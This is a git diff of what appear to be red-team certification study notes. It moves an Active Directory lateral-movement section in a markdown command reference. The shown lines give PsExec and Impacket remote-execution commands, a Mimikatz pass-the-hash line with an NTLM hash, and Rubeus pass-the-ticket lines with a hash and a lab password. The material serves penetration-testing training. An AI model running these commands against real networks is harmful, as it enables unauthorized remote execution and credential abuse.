@@ -13,9 +13,9 @@
 - [Local PrivEsc](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#priv-esc)
 - [Lateral Movement](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#lateral-movement)
     - [Powershell Remoting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#powershell-remoting)
-    - [Pass-the-hash/ticket](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz-pass-the-hash)
     - [PSExec and Impacket](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz-pass-the-ticket)
-- [Mimikatz and Tickets](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz)
+- [Pass-the-hash/ticket](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz-pass-the-hash)
+- [Mimikatz and Ticket Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz)
   - [DCSync](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#dcsync)
   - [Golden](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#golden)
   - [Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#silver)
@@ -260,7 +260,17 @@ If functions not on remote host:-
 
 * * *
 
+#### PSExec and Impacket
 
+```PsExec.exe -accepteula \\$HOSTNAME cmd```
+
+```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
+```smbexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
+```wmiexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
+* * *
 
 #### Mimikatz Pass-the-hash
 ```Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"' ```
@@ -274,20 +284,6 @@ If functions not on remote host:-
 ```Rubeus.exe asktgt /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /ptt```
 
 ```Rubeus.exe asktgt /user:webadmin /password:Password01 /ptt```
-
-* * *
-
-#### PSExec and Impacket
-
-```PsExec.exe -accepteula \\$HOSTNAME cmd```
-
-```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
-
-```smbexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
-
-```wmiexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
-
-
 
 * * *
 
